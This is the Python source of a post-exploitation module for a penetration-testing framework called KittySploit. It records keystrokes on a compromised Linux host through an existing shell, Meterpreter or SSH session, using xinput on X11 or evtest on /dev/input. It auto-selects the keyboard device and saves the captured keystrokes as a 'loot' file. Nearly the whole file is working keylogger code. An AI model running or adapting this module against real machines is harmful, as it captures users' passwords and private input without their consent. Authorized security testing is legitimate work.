#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Post module: capture keyboard events on Linux targets where X11 or evtest is usable.
For authorized security testing only.
"""

import os
import re
import time

from kittysploit import *
from lib.post.linux.system import System


class Module(Post, System):
    __info__ = {
        "name": "Linux Keyboard Event Capture",
        "description": (
            "Captures keyboard events for a short window using X11 (xinput) and/or evtest on "
            "/dev/input. Requires an interactive desktop session for X11 (set DISPLAY, e.g. :0) "
            "or sufficient privileges for evtest on input devices. Wayland sessions are not "
            "supported by the X11 path."
        ),
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
        "references": [],
    }

    method = OptChoice(
        "auto",
        "Capture backend: auto (xinput then evtest), x11, or evtest",
        required=False,
        choices=["auto", "x11", "evtest"],
    )
    duration = OptInteger(
        15,
        "Seconds to record (bounded by remote timeout(1) if available)",
        required=False,
    )
    display = OptString(
        ":0",
        "X11 DISPLAY for xinput (e.g. :0, :1)",
        required=False,
    )
    keyboard_id = OptInteger(
        0,
        "xinput device id (0 = auto-select first non-XTEST slave keyboard)",
        required=False,
        advanced=True,
    )
    evtest_device = OptString(
        "",
        "Path to evtest device (empty = auto from /proc/bus/input/devices)",
        required=False,
        advanced=True,
    )

    def check(self):
        sid = self.session_id.value if hasattr(self.session_id, "value") else str(self.session_id)
        if not sid or not str(sid).strip():
            print_error("Session ID not set")
            return False
        if not self.framework or not getattr(self.framework, "session_manager", None):
            print_error("Framework or session manager not available")
            return False
        session = self.framework.session_manager.get_session(str(sid).strip())
        if not session:
            print_error(f"Session {sid} not found")
            return False
        return True

    def run(self):
        dur = int(self.duration) if self.duration else 15
        if dur < 1:
            dur = 1
        if dur > 600:
            print_warning("Duration capped at 600 seconds")
            dur = 600

        method = self.method if self.method in ("auto", "x11", "evtest") else "auto"

        if method == "x11":
            return self._run_x11(dur)
        if method == "evtest":
            return self._run_evtest(dur)

        # auto
        if self.command_exists("xinput"):
            if self._run_x11(dur):
                return True
            print_warning("X11 capture failed or produced no data; trying evtest...")
        elif method == "auto":
            print_status("xinput not found; trying evtest...")

        if self.command_exists("evtest"):
            return self._run_evtest(dur)

        print_error("Neither xinput nor evtest is available on target")
        print_info("Install xorg-xinput (X11) or evtest, or use method x11/evtest explicitly")
        return False

    def _display_val(self) -> str:
        d = self.display if isinstance(self.display, str) else str(self.display or ":0")
        return d.strip() or ":0"

    def _keyboard_id_val(self) -> int:
        try:
            return int(self.keyboard_id)
        except (TypeError, ValueError):
            return 0

    def _evtest_device_val(self) -> str:
        if isinstance(self.evtest_device, str):
            return self.evtest_device.strip()
        return str(self.evtest_device or "").strip()

    def _has_timeout_cmd(self) -> bool:
        return self.command_exists("timeout")

    def _wrap_timeout(self, seconds: int, inner: str) -> str:
        if self._has_timeout_cmd():
            return f"timeout {seconds} {inner}"
        print_warning("timeout(1) not found; running without hard limit (session may hang)")
        return inner

    def _run_x11(self, dur: int) -> bool:
        if not self.command_exists("xinput"):
            print_error("xinput not found on target")
            return False

        disp = self._display_val()
        listing = self.cmd_exec(f"DISPLAY={disp} xinput list 2>&1")
        if not listing or "unable to open" in listing.lower() or "cannot open" in listing.lower():
            print_error(f"Cannot use DISPLAY={disp} (no X server or permission)")
            print_info(listing.strip() if listing else "(no output)")
            return False

        kid = self._keyboard_id_val()
        if kid <= 0:
            picked = self._pick_x11_keyboard_id(listing)
            if not picked:
                print_error("Could not auto-detect an xinput keyboard id from xinput list")
                print_debug(listing)
                return False
            kid = int(picked)
            print_status(f"Using xinput keyboard id={kid}")

        inner = f'env DISPLAY={disp} xinput test {kid} 2>&1'
        cmd = self._wrap_timeout(dur, inner)
        print_status(f"Recording X11 key events for ~{dur}s (user must type in that session)...")
        captured = self.cmd_exec(cmd)
        if not captured or not captured.strip():
            print_warning("No xinput output (wrong device id, no keypresses, or desktop idle)")
            return False

        return self._save_loot("x11_xinput", captured)

    def _pick_x11_keyboard_id(self, listing: str):
        candidates = []
        for line in listing.splitlines():
            if "XTEST" in line:
                continue
            low = line.lower()
            if "slave" not in low or "keyboard" not in low:
                continue
            m = re.search(r"id=(\d+)", line)
            if m:
                candidates.append((line, m.group(1)))
        for line, iid in candidates:
            if "translated" in line.lower():
                return iid
        if candidates:
            return candidates[-1][1]
        return None

    def _parse_evtest_keyboard_device(self) -> str:
        content = self.read_file("/proc/bus/input/devices")
        if not content:
            return ""
        name_block = ""
        best = ""
        for line in content.splitlines():
            if line.startswith("N: Name="):
                name_block = line
            elif line.startswith("H: Handlers="):
                m = re.search(r"event(\d+)", line)
                if not m:
                    continue
                nl = name_block.lower()
                if any(k in nl for k in ("keyboard", "keypad")):
                    best = f"/dev/input/event{m.group(1)}"
        return best

    def _run_evtest(self, dur: int) -> bool:
        if not self.command_exists("evtest"):
            print_error("evtest not found on target")
            return False

        dev = self._evtest_device_val()
        if not dev:
            dev = self._parse_evtest_keyboard_device()
        if not dev:
            dev = "/dev/input/event0"
            print_warning(f"Could not infer keyboard device; trying {dev}")

        inner = f"evtest {dev} 2>&1"
        cmd = self._wrap_timeout(dur, inner)
        print_status(f"Recording evtest from {dev} for ~{dur}s...")
        captured = self.cmd_exec(cmd)
        if not captured:
            print_error("No evtest output (permission denied on /dev/input or device missing)")
            return False
        low = captured.lower()
        if "permission denied" in low or "no such file" in low:
            print_error(captured.strip())
            return False

        return self._save_loot("evtest", captured)

    def _save_loot(self, tag: str, text: str) -> bool:
        ts = int(time.time())
        safe_tag = re.sub(r"[^a-zA-Z0-9_-]+", "_", tag)
        out_rel = os.path.join("loot", f"linux_keylog_{safe_tag}_{ts}.txt")
        header = (
            f"# KittySploit key event capture ({tag})\n"
            f"# X11 key lines are keycodes; map with target keymap if needed.\n\n"
        )
        if self.write_out_dir(out_rel, header + text):
            print_success(f"Saved capture to {out_rel}")
            print_info("--- preview (first 2000 chars) ---")
            preview = text[:2000]
            print_info(preview)
            if len(text) > 2000:
                print_warning(f"... truncated preview; full log in {out_rel}")
            return True
        print_error("write_out_dir failed")
        return False
